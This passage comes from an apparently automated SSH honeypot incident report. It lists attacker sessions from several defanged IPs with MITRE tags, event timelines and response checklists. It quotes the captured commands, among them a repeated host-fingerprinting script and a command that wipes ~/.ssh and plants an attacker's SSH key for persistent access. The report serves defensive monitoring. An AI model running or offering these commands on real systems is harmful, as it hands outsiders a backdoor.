| `2026-08-01 13:36:26` | `cowrie.command.success` |
| `2026-08-01 13:36:26` | `cowrie.command.input` |
| `2026-08-01 13:36:26` | `cowrie.command.input` |
| `2026-08-01 13:36:26` | `cowrie.command.input` |
| `2026-08-01 13:36:26` | `cowrie.command.input` |
| `2026-08-01 13:36:26` | `cowrie.log.closed` |
| `2026-08-01 13:36:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e65d30e942c2

| Field | Detail |
|---|---|
| **Source IP** | `116.110.151[.]49` |
| **First Seen** | 2026-08-01 13:37 |
| **Last Seen** | 2026-08-01 13:37 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:37:25` | `cowrie.session.connect` |
| `2026-08-01 13:37:25` | `cowrie.client.version` |
| `2026-08-01 13:37:26` | `cowrie.client.kex` |
| `2026-08-01 13:37:28` | `cowrie.login.success` |
| `2026-08-01 13:37:29` | `cowrie.direct-tcpip.request` |
| `2026-08-01 13:37:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 13:37:35` | `cowrie.direct-tcpip.data` |
| `2026-08-01 13:37:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `116.110.151[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92f8c59e5c40

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:38 |
| **Last Seen** | 2026-08-01 13:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:38:09` | `cowrie.session.connect` |
| `2026-08-01 13:38:09` | `cowrie.client.version` |
| `2026-08-01 13:38:09` | `cowrie.client.kex` |
| `2026-08-01 13:38:10` | `cowrie.login.success` |
| `2026-08-01 13:38:11` | `cowrie.session.params` |
| `2026-08-01 13:38:11` | `cowrie.command.input` |
| `2026-08-01 13:38:11` | `cowrie.command.input` |
| `2026-08-01 13:38:11` | `cowrie.command.input` |
| `2026-08-01 13:38:11` | `cowrie.command.input` |
| `2026-08-01 13:38:11` | `cowrie.command.input` |
| `2026-08-01 13:38:11` | `cowrie.command.success` |
| `2026-08-01 13:38:11` | `cowrie.command.input` |
| `2026-08-01 13:38:11` | `cowrie.command.input` |
| `2026-08-01 13:38:11` | `cowrie.command.input` |
| `2026-08-01 13:38:11` | `cowrie.command.input` |
| `2026-08-01 13:38:11` | `cowrie.log.closed` |
| `2026-08-01 13:38:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1230d8dd9cec

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:39 |
| **Last Seen** | 2026-08-01 13:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:39:59` | `cowrie.session.connect` |
| `2026-08-01 13:39:59` | `cowrie.client.version` |
| `2026-08-01 13:39:59` | `cowrie.client.kex` |
| `2026-08-01 13:39:59` | `cowrie.login.success` |
| `2026-08-01 13:40:01` | `cowrie.session.params` |
| `2026-08-01 13:40:01` | `cowrie.command.input` |
| `2026-08-01 13:40:01` | `cowrie.command.input` |
| `2026-08-01 13:40:01` | `cowrie.command.input` |
| `2026-08-01 13:40:01` | `cowrie.command.input` |
| `2026-08-01 13:40:01` | `cowrie.command.input` |
| `2026-08-01 13:40:01` | `cowrie.command.success` |
| `2026-08-01 13:40:01` | `cowrie.command.input` |
| `2026-08-01 13:40:01` | `cowrie.command.input` |
| `2026-08-01 13:40:01` | `cowrie.command.input` |
| `2026-08-01 13:40:01` | `cowrie.command.input` |
| `2026-08-01 13:40:01` | `cowrie.log.closed` |
| `2026-08-01 13:40:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4d928a4de8e

| Field | Detail |
|---|---|
| **Source IP** | `116.110.151[.]49` |
| **First Seen** | 2026-08-01 13:40 |
| **Last Seen** | 2026-08-01 13:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:40:16` | `cowrie.session.connect` |
| `2026-08-01 13:40:16` | `cowrie.client.version` |
| `2026-08-01 13:40:16` | `cowrie.client.kex` |
| `2026-08-01 13:40:19` | `cowrie.login.success` |
| `2026-08-01 13:40:19` | `cowrie.direct-tcpip.request` |
| `2026-08-01 13:40:20` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 13:40:20` | `cowrie.direct-tcpip.data` |
| `2026-08-01 13:40:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `116.110.151[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8347e64adece

| Field | Detail |
|---|---|
| **Source IP** | `116.110.144[.]94` |
| **First Seen** | 2026-08-01 13:41 |
| **Last Seen** | 2026-08-01 13:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:41:32` | `cowrie.session.connect` |
| `2026-08-01 13:41:32` | `cowrie.client.version` |
| `2026-08-01 13:41:32` | `cowrie.client.kex` |
| `2026-08-01 13:41:33` | `cowrie.login.success` |
| `2026-08-01 13:41:34` | `cowrie.direct-tcpip.request` |
| `2026-08-01 13:41:34` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 13:41:34` | `cowrie.direct-tcpip.data` |
| `2026-08-01 13:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.144[.]94` to AbuseIPDB if not already reported
- [ ] Block `116.110.144[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-932876cbd15e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:41 |
| **Last Seen** | 2026-08-01 13:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:41:48` | `cowrie.session.connect` |
| `2026-08-01 13:41:48` | `cowrie.client.version` |
| `2026-08-01 13:41:48` | `cowrie.client.kex` |
| `2026-08-01 13:41:49` | `cowrie.login.success` |
| `2026-08-01 13:41:50` | `cowrie.session.params` |
| `2026-08-01 13:41:50` | `cowrie.command.input` |
| `2026-08-01 13:41:50` | `cowrie.command.input` |
| `2026-08-01 13:41:50` | `cowrie.command.input` |
| `2026-08-01 13:41:50` | `cowrie.command.input` |
| `2026-08-01 13:41:50` | `cowrie.command.input` |
| `2026-08-01 13:41:50` | `cowrie.command.success` |
| `2026-08-01 13:41:50` | `cowrie.command.input` |
| `2026-08-01 13:41:50` | `cowrie.command.input` |
| `2026-08-01 13:41:50` | `cowrie.command.input` |
| `2026-08-01 13:41:50` | `cowrie.command.input` |
| `2026-08-01 13:41:50` | `cowrie.log.closed` |
| `2026-08-01 13:41:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26cccf948540

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:43 |
| **Last Seen** | 2026-08-01 13:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:43:38` | `cowrie.session.connect` |
| `2026-08-01 13:43:38` | `cowrie.client.version` |
| `2026-08-01 13:43:39` | `cowrie.client.kex` |
| `2026-08-01 13:43:39` | `cowrie.login.success` |
| `2026-08-01 13:43:40` | `cowrie.session.params` |
| `2026-08-01 13:43:40` | `cowrie.command.input` |
| `2026-08-01 13:43:40` | `cowrie.command.input` |
| `2026-08-01 13:43:40` | `cowrie.command.input` |
| `2026-08-01 13:43:40` | `cowrie.command.input` |
| `2026-08-01 13:43:40` | `cowrie.command.input` |
| `2026-08-01 13:43:40` | `cowrie.command.success` |
| `2026-08-01 13:43:40` | `cowrie.command.input` |
| `2026-08-01 13:43:40` | `cowrie.command.input` |
| `2026-08-01 13:43:40` | `cowrie.command.input` |
| `2026-08-01 13:43:40` | `cowrie.command.input` |
| `2026-08-01 13:43:40` | `cowrie.log.closed` |
| `2026-08-01 13:43:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-875bf7eb9ac9

| Field | Detail |
|---|---|
| **Source IP** | `116.110.151[.]49` |
| **First Seen** | 2026-08-01 13:44 |
| **Last Seen** | 2026-08-01 13:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:44:28` | `cowrie.session.connect` |
| `2026-08-01 13:44:28` | `cowrie.client.version` |
| `2026-08-01 13:44:29` | `cowrie.client.kex` |
| `2026-08-01 13:44:29` | `cowrie.login.success` |
| `2026-08-01 13:44:30` | `cowrie.direct-tcpip.request` |
| `2026-08-01 13:44:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 13:44:30` | `cowrie.direct-tcpip.data` |
| `2026-08-01 13:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `116.110.151[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c9b4c9c582a

| Field | Detail |
|---|---|
| **Source IP** | `31.173.0[.]46` |
| **First Seen** | 2026-08-01 13:44 |
| **Last Seen** | 2026-08-01 13:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:44:52` | `cowrie.session.connect` |
| `2026-08-01 13:44:53` | `cowrie.client.version` |
| `2026-08-01 13:44:53` | `cowrie.client.kex` |
| `2026-08-01 13:44:54` | `cowrie.login.success` |
| `2026-08-01 13:44:55` | `cowrie.direct-tcpip.request` |
| `2026-08-01 13:44:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.0[.]46` to AbuseIPDB if not already reported
- [ ] Block `31.173.0[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d00a970f1d94

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:45 |
| **Last Seen** | 2026-08-01 13:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:45:31` | `cowrie.session.connect` |
| `2026-08-01 13:45:31` | `cowrie.client.version` |
| `2026-08-01 13:45:31` | `cowrie.client.kex` |
| `2026-08-01 13:45:32` | `cowrie.login.success` |
| `2026-08-01 13:45:32` | `cowrie.session.params` |
| `2026-08-01 13:45:32` | `cowrie.command.input` |
| `2026-08-01 13:45:32` | `cowrie.command.input` |
| `2026-08-01 13:45:32` | `cowrie.command.input` |
| `2026-08-01 13:45:32` | `cowrie.command.input` |
| `2026-08-01 13:45:32` | `cowrie.command.input` |
| `2026-08-01 13:45:32` | `cowrie.command.success` |
| `2026-08-01 13:45:32` | `cowrie.command.input` |
| `2026-08-01 13:45:32` | `cowrie.command.input` |
| `2026-08-01 13:45:32` | `cowrie.command.input` |
| `2026-08-01 13:45:32` | `cowrie.command.input` |
| `2026-08-01 13:45:33` | `cowrie.log.closed` |
| `2026-08-01 13:45:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-486539dfb3a2

| Field | Detail |
|---|---|
| **Source IP** | `116.110.144[.]94` |
| **First Seen** | 2026-08-01 13:47 |
| **Last Seen** | 2026-08-01 13:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:47:04` | `cowrie.session.connect` |
| `2026-08-01 13:47:04` | `cowrie.client.version` |
| `2026-08-01 13:47:04` | `cowrie.client.kex` |
| `2026-08-01 13:47:06` | `cowrie.login.success` |
| `2026-08-01 13:47:07` | `cowrie.direct-tcpip.request` |
| `2026-08-01 13:47:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 13:47:07` | `cowrie.direct-tcpip.data` |
| `2026-08-01 13:47:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.144[.]94` to AbuseIPDB if not already reported
- [ ] Block `116.110.144[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1816a17b25ed

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:47 |
| **Last Seen** | 2026-08-01 13:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:47:22` | `cowrie.session.connect` |
| `2026-08-01 13:47:22` | `cowrie.client.version` |
| `2026-08-01 13:47:22` | `cowrie.client.kex` |
| `2026-08-01 13:47:23` | `cowrie.login.success` |
| `2026-08-01 13:47:24` | `cowrie.session.params` |
| `2026-08-01 13:47:24` | `cowrie.command.input` |
| `2026-08-01 13:47:24` | `cowrie.command.input` |
| `2026-08-01 13:47:24` | `cowrie.command.input` |
| `2026-08-01 13:47:24` | `cowrie.command.input` |
| `2026-08-01 13:47:24` | `cowrie.command.input` |
| `2026-08-01 13:47:24` | `cowrie.command.success` |
| `2026-08-01 13:47:24` | `cowrie.command.input` |
| `2026-08-01 13:47:24` | `cowrie.command.input` |
| `2026-08-01 13:47:24` | `cowrie.command.input` |
| `2026-08-01 13:47:24` | `cowrie.command.input` |
| `2026-08-01 13:47:24` | `cowrie.log.closed` |
| `2026-08-01 13:47:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e2ec476376b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:49 |
| **Last Seen** | 2026-08-01 13:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:49:00` | `cowrie.session.connect` |
| `2026-08-01 13:49:01` | `cowrie.client.version` |
| `2026-08-01 13:49:01` | `cowrie.client.kex` |
| `2026-08-01 13:49:02` | `cowrie.login.success` |
| `2026-08-01 13:49:03` | `cowrie.session.params` |
| `2026-08-01 13:49:03` | `cowrie.command.input` |
| `2026-08-01 13:49:03` | `cowrie.command.input` |
| `2026-08-01 13:49:03` | `cowrie.command.input` |
| `2026-08-01 13:49:03` | `cowrie.command.input` |
| `2026-08-01 13:49:03` | `cowrie.command.input` |
| `2026-08-01 13:49:03` | `cowrie.command.success` |
| `2026-08-01 13:49:03` | `cowrie.command.input` |
| `2026-08-01 13:49:03` | `cowrie.command.input` |
| `2026-08-01 13:49:03` | `cowrie.command.input` |
| `2026-08-01 13:49:03` | `cowrie.command.input` |
| `2026-08-01 13:49:03` | `cowrie.log.closed` |
| `2026-08-01 13:49:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a60af1a50a50

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-01 13:49 |
| **Last Seen** | 2026-08-01 13:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:49:21` | `cowrie.session.connect` |
| `2026-08-01 13:49:21` | `cowrie.client.version` |
| `2026-08-01 13:49:21` | `cowrie.client.kex` |
| `2026-08-01 13:49:22` | `cowrie.login.success` |
| `2026-08-01 13:49:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-004a622233c1

| Field | Detail |
|---|---|
| **Source IP** | `152.32.182[.]8` |
| **First Seen** | 2026-08-01 13:49 |
| **Last Seen** | 2026-08-01 13:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:49:21` | `cowrie.session.connect` |
| `2026-08-01 13:49:21` | `cowrie.client.version` |
| `2026-08-01 13:49:21` | `cowrie.client.kex` |
| `2026-08-01 13:49:21` | `cowrie.login.success` |
| `2026-08-01 13:49:22` | `cowrie.session.params` |
| `2026-08-01 13:49:22` | `cowrie.command.input` |
| `2026-08-01 13:49:22` | `cowrie.command.failed` |
| `2026-08-01 13:49:22` | `cowrie.log.closed` |
| `2026-08-01 13:49:23` | `cowrie.session.params` |
| `2026-08-01 13:49:23` | `cowrie.command.input` |
| `2026-08-01 13:49:23` | `cowrie.session.file_download` |
| `2026-08-01 13:49:23` | `cowrie.log.closed` |
| `2026-08-01 13:49:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.182[.]8` to AbuseIPDB if not already reported
- [ ] Block `152.32.182[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01f4cc039921

| Field | Detail |
|---|---|
| **Source IP** | `152.32.182[.]8` |
| **First Seen** | 2026-08-01 13:49 |
| **Last Seen** | 2026-08-01 13:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:49:23` | `cowrie.session.connect` |
| `2026-08-01 13:49:23` | `cowrie.client.version` |
| `2026-08-01 13:49:23` | `cowrie.client.kex` |
| `2026-08-01 13:49:23` | `cowrie.login.success` |
| `2026-08-01 13:49:23` | `cowrie.session.closed` |

**Recommended Actions:**
